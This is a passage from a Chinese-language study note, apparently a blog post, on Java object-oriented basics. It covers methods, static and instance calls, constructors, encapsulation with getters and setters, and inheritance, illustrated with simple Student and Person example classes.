class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    * 修饰符  返回类型   方法名（...）&#123;</span><br><span class="hljs-comment">    * //方法体</span><br><span class="hljs-comment">    * return 返回值；</span><br><span class="hljs-comment">    * &#125;*/</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayhello</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>        <span class="hljs-keyword">return</span> a&gt;b? a:b;<span class="hljs-comment">//三元运算符</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>return&amp;&amp; break:</strong></p><p>return ：标志方法的结束，返回一个结果或者空</p><p>break：跳出switch循环，结束循环</p><p><strong>方法调用：</strong></p><p><em>静态方法</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br><br>    <span class="hljs-comment">//static 静态方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World&quot;</span>);<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//**********在下面的程序可以直接在main中调用（类.方法）****************************</span><br><br><br><span class="hljs-keyword">package</span> com.oop.dome01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Student.say();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><em>非静态方法</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br><br>    <span class="hljs-comment">//非 静态方法</span><br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World&quot;</span>);<br><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//****************非静态方法不可直接调用，实例化后再由对象调用（对象.方法）**********************</span><br><br><br><span class="hljs-keyword">package</span> com.oop.dome01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>       <span class="hljs-comment">//非静态</span><br><br>        <span class="hljs-comment">//先实例化  new</span><br>       Student student1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>       <span class="hljs-comment">//再调用</span><br>       student1.say();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>加static的方法与类一起加载，非静态的方法，实例化后才存在  </p><p>在同一个类中，可以直接在main方法中调用其他静态方法，</p><p>调用其他非静态的方法：</p><p>1 .在main中先new 实例化，再调用 </p><p>2 .或者 非静态方法改成静态方法（加static）</p><p><strong>值传递&amp;&amp;引用传递：</strong><br>值传递传递形参，另外开辟了一块内存</p><p>引用传递，将类实例化得到实例化对象，实例化对象传递时直接指向同一块内存传递</p><hr><h4 id="类与对象的创建"><a href="#类与对象的创建" class="headerlink" title="类与对象的创建"></a>类与对象的创建</h4><ul><li>一个程序应该只有一个main方法</li></ul><p><strong>使用new关键字创建对象：</strong><br>使用new关键字创建对象时，除了分配内存空间，还会给创建好的对象进行默认的初始化以及类中的构造器的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br><br>    <span class="hljs-comment">//属性： 字段</span><br>    String name;<br>    <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-comment">//方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">study</span><span class="hljs-params">()</span>&#123;    <span class="hljs-comment">//this代表当前这个类，this.当前类的属性</span><br>        System.out.println(<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot;在学习&quot;</span>);<br>    &#125;<br>&#125;<br><br><br><br><br><br><br><br><span class="hljs-keyword">package</span> com.oop.dome02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//类：抽象的，需要实例化</span><br>        <span class="hljs-comment">//类实例化后返回对象</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">xiaoming</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        Student daming=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        <br>        <span class="hljs-comment">//给xiaoming的属性赋值</span><br>        xiaoming.name = <span class="hljs-string">&quot;小明&quot;</span>;<br>        xiaoming.age=<span class="hljs-number">20</span>;<br>        <br>        <span class="hljs-comment">//调用方法</span><br>        xiaoming.study();<span class="hljs-comment">//小明在学习</span><br>        daming.study();<span class="hljs-comment">//null在学习</span><br>       <br>        <span class="hljs-comment">//打印属性</span><br>        System.out.println(xiaoming.name);<span class="hljs-comment">//小明</span><br>        System.out.println(xiaoming.age);<span class="hljs-comment">//20</span><br>        System.out.println(daming.name);<span class="hljs-comment">//null</span><br>        System.out.println(daming.age);<span class="hljs-comment">//0</span><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>类是对象的模板，对象是类的实例，就像以上Student类中属性name,age不能写死，它只是一个模板，对象就是它的实例，用对象来调用属性进行赋值，[创建对象时默认初始化属性（daming  的name&#x3D;null   age&#x3D;0）]</p><p><strong>所以回到了开始那句话：面向对象编程的本质是：以类的方式组织代码，以对象的组织（封装）数据</strong></p><hr><h4 id="构造器详解"><a href="#构造器详解" class="headerlink" title="构造器详解"></a>构造器详解</h4><ul><li><p>类中的构造器也叫构造方法，是在创建对象时必须调用的，并且构造器具有以下两个特点：<br><em>1 .必须和类的名称相同</em></p><p><em>2 .必须没有返回类型，也不能写void</em></p></li><li><p>一个类即使什么也没有写，<em><strong>它也有一个默认构造器</strong></em></p></li><li><p>显示定义构造器(它其实就是一个特殊的无返回值的方法)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>构造器的作用：</strong></p><ol><li><p>实例化初始值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.name=<span class="hljs-string">&quot;lili&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-keyword">package</span> com.oop.dome02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//new 实例化对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        System.out.println(person.name);<span class="hljs-comment">//lili</span><br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>所以实例化对象的属性：</p><ol><li>可以通过在main中实例化对象后用对象.属性赋值(即使用默认无参构造器)，</li><li>可以在类中通过  显示无参构造器（属性写死）</li><li>有参构造器初始化（属性传参   new时传参）</li></ol></li></ol></li></ul><p><strong>有参构造&amp;&amp;无参构造</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    String name;<br><br>    <span class="hljs-comment">//new 关键字实例化，本质是在调用构造器</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-comment">//有参构造：一旦定义了有参构造，无参构造就必须显式定义</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">package</span> com.oop.dome02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//new 实例化对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;xiaoming&quot;</span>);<span class="hljs-comment">//不加参数调用的就是无参构造器，打印结果为null，加上参数调用有参构造器，打印机结果xiaoming</span><br> <span class="hljs-comment">// Person person1 = new Person(&quot;xiaoming&quot;);=======Person person1=new person();    person1.name=&quot;小明&quot;;     </span><br>        System.out.println(person1.name);<br><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li><p>new 实例化，本质在调用构造器，会自动根据参数判断，有参数的直接调用有参构造器 （方法重载）。构造器用来初始化值，在构造器中  <code>this.属性</code>  直接就可以赋值</p></li><li><p><u>注意</u>：<em>一旦定义了有参构造，并且也无参实例化了（无参创建对象），无参构造就必须显式定义，否则会报错</em>   </p><p>默认类中是有无参构造的，写了有参构造，无参构造就没有了，就需要显式定义 </p><p>alt+insert 快捷键默认生成有参构造器</p></li><li><p>定义不同有参构造器即方法重载，在类中创建不同的属性，不同属性作为构造器参数实现方法重载</p></li></ul><hr><p><strong>创建对象内存分析</strong></p><p><img src="/2025/03/20/java-%E5%9F%BA%E7%A1%80/image-20250322185600248.png" alt="image-20250322185600248"></p><hr><h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><ol><li><p>类是一个模板（抽象的），对象是一个具体的实例</p></li><li><p>方法：定义，调用</p></li><li><p>对象是通过<strong>引用</strong>来操作的：栈—–&gt;堆（地址）</p></li><li><p>属性：字段 Field   成员变量</p><ul><li><p>初始化 ：数字0  0.0 </p><p>​char : u0000</p></li></ul></li></ol><p>​  boolean: false</p><p>​引用： null</p><p>​修饰符    属性类型   属性名&#x3D;属性值</p><ol start="5"><li>对象的创建和使用：<ul><li>必须使用new关键字创造对象  ，构造器</li><li>对象的属性方法调用： <code>对象名.属性   对象.方法</code></li></ul></li><li>类：静态的属性，动态的方法</li></ol><hr><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><ul><li><p>程序追求 <em>高内聚低耦合</em></p><p>高内聚就是：类的内部数据操作细节自己完成，不允许外部干涉；低耦合：仅暴露少量的方法给外部使用</p></li><li><p>属性私有   get&#x2F;set  （alt  + insert 快捷键生成get&#x2F;set方法）</p></li><li><p>关键字private  就不能直接 s1.name 来操作 借助get方法返回name 调用的方法得到name</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> com.oop.dome03;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-comment">//属性私有  private 关键字   外部的就不能直接  对象,属性 来操作属性</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">char</span> sex;<br><br>    <span class="hljs-comment">//提供一些操作私有属性的方法</span><br>    <span class="hljs-comment">//提供一些public的get /set方法</span><br><br>    <span class="hljs-comment">//get 获得数据  就是借助方法获得</span><br>    <span class="hljs-keyword">public</span>  String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>    <span class="hljs-comment">//set 给这个数据设置值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>&#125;<br><br><br><br><br><br><br><span class="hljs-keyword">package</span> com.oop.dome02;<br><br><span class="hljs-keyword">import</span> com.oop.dome03.Student ;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        System.out.println(s1.getName());<span class="hljs-comment">//null</span><br>        s1.setName(<span class="hljs-string">&quot;小明&quot;</span>);<span class="hljs-comment">//通过方法进行设置属性</span><br>        System.out.println(s1.getName());<span class="hljs-comment">//小明</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>思考：</strong>不借助set方法的话，有参构造器也可以直接初始化属性</p><p><em><strong>所以又体现出来构造器就是特殊的方法</strong></em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome03;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;xiaoming&quot;</span>);<br>        System.out.println(s1.getName());<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">package</span> com.oop.dome03;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-comment">//属性私有  private 关键字   外部的就不能直接  对象,属性 来操作属性</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">char</span> sex;<br><br>    <span class="hljs-comment">//提供一些操作私有属性的方法</span><br>    <span class="hljs-comment">//提供一些public的get /set方法</span><br><br>    <span class="hljs-comment">//get 获得数据  就是借助方法获得</span><br>    <span class="hljs-keyword">public</span>  String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.name;<br>    &#125;<br><br>   <br><span class="hljs-comment">//有参构造器初始化属性</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>使用属性的时候再传参即可，构造器在new的时候就会调用，在new的时候直接传参</p><p><strong>封装的好处：</strong></p><p>规避不合法的数据，在set方法中设置条件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome03;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br><br>        System.out.println(s1.getAge());<br>        s1.setAge(<span class="hljs-number">999</span>);<span class="hljs-comment">//数据不合法</span><br>        System.out.println(s1.getAge());<span class="hljs-comment">//!!!!!！！这里在set方法中设置了合法条件，所以输出3</span><br><br><br>    &#125;<br>&#125;<br><br><br><br><br><br><span class="hljs-keyword">package</span> com.oop.dome03;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-comment">//属性私有  private 关键字   外部的就不能直接  对象,属性 来操作属性</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">char</span> sex;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-comment">//提供一些操作私有属性的方法</span><br>    <span class="hljs-comment">//提供一些public的get /set方法</span><br><br>    <span class="hljs-comment">//get 获得数据  就是借助方法获得</span><br>    <span class="hljs-keyword">public</span>  <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.age;<br>    &#125;<br><br>    <span class="hljs-comment">//set 给这个数据设置值</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>       <span class="hljs-keyword">if</span>(age&gt;<span class="hljs-number">120</span>||age&lt;<span class="hljs-number">0</span>)&#123;<br>           <span class="hljs-built_in">this</span>.age=<span class="hljs-number">3</span>;<br>       &#125;<span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-built_in">this</span>.age = age;<br>       &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>好处：</strong></p><ol><li>提高程序的安全性，保护数据</li><li>隐藏代码的实现细节</li><li>统一接口</li><li>系统可维护增加</li></ol><hr><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><ul><li><p>继承的本质是对一批类的抽象</p></li><li><p>关键字 extends 子类是父类的扩展</p></li><li><p>继承是类与类之间的一种关系，类与类之间的关系还有依赖，组合，聚合等</p></li><li><p>继承关系的两个类，一个为子类（派生类），一个为父类（基类）。</p></li><li><p><strong>只要子类继承了父类，实例化子类对象，对象也可以用父类中的属性和方法</strong></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//父类</span><br><span class="hljs-keyword">package</span> com.oop.dome04;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> money=<span class="hljs-number">10_0000_0000</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">say</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;说了一句话&quot;</span>);<br><br>    &#125;&#125;<br><br><br><br><span class="hljs-comment">//子类继承父类</span><br><span class="hljs-keyword">package</span> com.oop.dome04;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;<br>&#125;<br><br><br><br><span class="hljs-comment">//实例化子类，子类对象调用父类的方法和属性</span><br><span class="hljs-keyword">package</span> com.oop;<br><br><span class="hljs-keyword">import</span> com.oop.dome04.Student;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.say();<br>        System.out.println(student.money);<br><br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>修饰符：public（要加public,才能用子类创建的对象调用父类的属性）protected,default,private(私有的   子类不能继承私有属性，要借助get,set)</p><ul><li><p>在java中所有的类都默认直接或间接继承object类，也可以显示定义继承object类</p></li><li><p>java中只有单继承（即一个儿子对应一个爸爸）</p></li><li><p>犯的错误：</p><p>在父类中定义方法无返回值，使用子类创建的对象调用该方法时，因为该方法无返回值，不能直接输出，可以直接调用就好</p></li></ul><hr><h4 id="super详解"><a href="#super详解" class="headerlink" title="super详解"></a>super详解</h4><ul><li><p>子类的方法中访问父类的属性或方法 